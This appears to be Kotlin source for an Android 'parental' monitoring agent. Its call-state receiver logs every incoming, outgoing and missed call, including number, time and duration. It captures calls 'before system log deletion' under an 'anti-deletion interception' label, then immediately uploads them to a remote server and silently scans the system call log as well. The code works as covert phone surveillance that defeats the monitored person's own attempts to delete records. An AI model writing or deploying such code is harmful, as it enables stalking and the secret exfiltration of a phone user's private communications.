package com.parental.agent.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import com.parental.agent.collectors.calls.CallCollector
import com.parental.agent.data.local.AppDatabase
import com.parental.agent.data.local.AppPreferences
import com.parental.agent.data.local.entity.NormalizedEventEntity
import com.parental.agent.sync.ApiConstants
import com.parental.agent.sync.SyncPayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap

class CallStateReceiver : BroadcastReceiver() {

    data class CallSession(
        val rawNumber: String,
        val cleanNumber: String,
        var isIncoming: Boolean,
        var startTime: Long,
        var lastState: String
    )

    companion object {
        private const val TAG = "CallStateReceiver"
        
        // Multi-call active session tracking (handles Call Waiting & Concurrent Calls)
        private val activeSessions = ConcurrentHashMap<String, CallSession>()
        @Volatile
        private var lastGlobalState = TelephonyManager.EXTRA_STATE_IDLE
        @Volatile
        private var globalLastNumber = "Unknown"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED == intent.action) {
            val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE) ?: return
            
            @Suppress("DEPRECATION")
            val rawNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) 
                ?: intent.getStringExtra("incoming_number")
                ?: globalLastNumber

            if (rawNumber != "Unknown" && rawNumber.isNotBlank()) {
                globalLastNumber = rawNumber
            }

            val cleanNum = globalLastNumber.replace(Regex("[^0-9+]"), "").ifEmpty { "unknown" }
            Log.d(TAG, "Phone State Transition: state=$stateStr, rawNumber=$globalLastNumber, cleanNum=$cleanNum")

            when (stateStr) {
                TelephonyManager.EXTRA_STATE_RINGING -> {
                    // Call Waiting or Incoming Call arriving
                    val session = activeSessions.getOrPut(cleanNum) {
                        CallSession(
                            rawNumber = globalLastNumber,
                            cleanNumber = cleanNum,
                            isIncoming = true,
                            startTime = System.currentTimeMillis(),
                            lastState = TelephonyManager.EXTRA_STATE_RINGING
                        )
                    }
                    session.isIncoming = true
                    session.lastState = TelephonyManager.EXTRA_STATE_RINGING
                    if (session.startTime == 0L) session.startTime = System.currentTimeMillis()
                    
                    lastGlobalState = TelephonyManager.EXTRA_STATE_RINGING
                    Log.i(TAG, "INCOMING/WAITING CALL DETECTED: Ringing from ${session.rawNumber}")
                }

                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                    val session = activeSessions[cleanNum]
                    if (session != null) {
                        if (session.lastState == TelephonyManager.EXTRA_STATE_RINGING) {
                            session.isIncoming = true // Answered incoming / waiting call
                        }
                        session.lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
                        if (session.startTime == 0L) session.startTime = System.currentTimeMillis()
                        Log.i(TAG, "CALL OFFHOOK (Tracked Session): number=${session.rawNumber}, isIncoming=${session.isIncoming}")
                    } else {
                        // Outgoing call initiated
                        val newSession = CallSession(
                            rawNumber = globalLastNumber,
                            cleanNumber = cleanNum,
                            isIncoming = false,
                            startTime = System.currentTimeMillis(),
                            lastState = TelephonyManager.EXTRA_STATE_OFFHOOK
                        )
                        activeSessions[cleanNum] = newSession
                        Log.i(TAG, "CALL OFFHOOK (New Outgoing Session): number=$globalLastNumber")
                    }
                    lastGlobalState = TelephonyManager.EXTRA_STATE_OFFHOOK
                }

                TelephonyManager.EXTRA_STATE_IDLE -> {
                    Log.i(TAG, "PHONE STATE IDLE: Processing ${activeSessions.size} active session(s)...")

                    // Process all active call sessions that completed or were missed/rejected
                    val iterator = activeSessions.entries.iterator()
                    while (iterator.hasNext()) {
                        val entry = iterator.next()
                        val session = entry.value

                        val durationMs = if (session.startTime > 0) System.currentTimeMillis() - session.startTime else 0
                        val durationSec = (durationMs / 1000).toInt()

                        val callType = when {
                            session.lastState == TelephonyManager.EXTRA_STATE_RINGING -> "MISSED"
                            session.isIncoming -> "INCOMING"
                            else -> "OUTGOING"
                        }

                        val capturedStartTime = if (session.startTime > 0) session.startTime else System.currentTimeMillis()
                        val deterministicEventId = "evt_call_${session.cleanNumber}_${callType}_${capturedStartTime / 1000}"

                        Log.i(TAG, "ANTI-DELETION INTERCEPTION: Captured $callType call (${session.rawNumber}, ${durationSec}s) BEFORE system log deletion!")

                        val prefs = AppPreferences(context)
                        val activeDeviceId = prefs.getDeviceId()

                        CoroutineScope(Dispatchers.IO).launch {
                            try {
                                val database = AppDatabase.getInstance(context)
                                
                                val payload = JSONObject().apply {
                                    put("phoneNumber", session.rawNumber)
                                    put("contactName", "Target Contact")
                                    put("callType", callType)
                                    put("callDate", capturedStartTime)
                                    put("durationSeconds", durationSec)
                                    put("antiDeletionCaptured", true)
                                }

                                val eventEntity = NormalizedEventEntity(
                                    eventId = deterministicEventId,
                                    deviceId = activeDeviceId,
                                    source = "calls",
                                    eventType = "call_record",
                                    timestamp = capturedStartTime,
                                    collectionMethod = "android_api",
                                    payloadJson = payload.toString(),
                                    isSynced = false
                                )

                                database.eventDao().insertEvent(eventEntity)
                                performInstantUpload(database, activeDeviceId)

                            } catch (e: Exception) {
                                Log.e(TAG, "Error in anti-deletion multi-call capture: ${e.message}", e)
                            }
                        }

                        iterator.remove()
                    }

                    lastGlobalState = TelephonyManager.EXTRA_STATE_IDLE
                    globalLastNumber = "Unknown"

                    // Scan system CallLog.Calls for additional OS-logged call records
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            val collector = CallCollector(context)
                            collector.collect()
                        } catch (e: Exception) {
                            // Quiet fail
                        }
                    }
                }
            }
        }
    }

    private suspend fun performInstantUpload(database: AppDatabase, activeDeviceId: String) {
        val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)

        if (unsyncedEvents.isNotEmpty()) {
            val eventPayloads = unsyncedEvents.map { entity ->
                val payloadMap = try {
                    val json = JSONObject(entity.payloadJson)
                    val map = mutableMapOf<String, Any?>()
                    json.keys().forEach { key -> map[key] = json.get(key) }
                    map
                } catch (e: Exception) {
                    emptyMap<String, Any?>()
                }

                mapOf(
                    "eventId" to entity.eventId,
                    "deviceId" to activeDeviceId,
                    "source" to entity.source,
                    "eventType" to entity.eventType,
                    "timestamp" to entity.timestamp,
                    "collectionMethod" to entity.collectionMethod,
                    "payload" to payloadMap
                )
            }

            val payload = SyncPayload(
                deviceId = activeDeviceId,
                events = eventPayloads
            )

            Log.i(TAG, "Executing Instant HTTP POST Upload for ${unsyncedEvents.size} event(s)...")
            val response = ApiConstants.apiService.syncEvents(payload)

            if (response.isSuccessful && response.body()?.success == true) {
                val body = response.body()
                val serverConfirmedIds = body?.syncedEventIds.orEmpty()
                val localEventIds = unsyncedEvents.map { it.eventId }
                val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }

                if (confirmedSyncedIds.isNotEmpty()) {
                    database.eventDao().markEventsSynced(confirmedSyncedIds)
                    Log.i(TAG, "SUCCESS: Call Payload server ACK confirmed for ${confirmedSyncedIds.size} event(s).")
                }
            }
        }
    }
}
